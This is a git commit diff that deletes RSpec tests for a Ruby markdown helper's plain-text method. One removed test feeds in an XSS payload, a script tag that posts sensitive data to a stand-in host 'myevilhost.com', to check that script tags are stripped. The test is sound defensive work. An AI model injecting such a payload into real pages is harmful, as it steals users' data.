11bf29cf6476d80779bab054c7ff185ed383d5dd
David Wessman <david.wesmn@gmail.com>
2017-10-05 15:39:26 +0200

    Remove unused helper and mailer methods

--- spec/helpers/markdown_helper_spec.rb
+++ spec/helpers/markdown_helper_spec.rb
@@ -18,22 +18,4 @@ RSpec.describe MarkdownHelper do
       result.should_not include('</script>')
     end
   end
-
-  describe 'plain' do
-    it 'does not allow XSS' do
-      xss = "<script>$.ajax('myevilhost.com', { data: sensitiveInformation })</script>"
-      result = helper.markdown_plain(xss)
-
-      result.should_not include('<script>')
-      result.should_not include('</script>')
-    end
-
-    it 'remove html-tags' do
-      input = '**Strong text** *Italics*'
-      result = helper.markdown_plain(input)
-
-      result.should_not include('<strong>')
-      result.should_not include('<em>')
-    end
-  end
 end
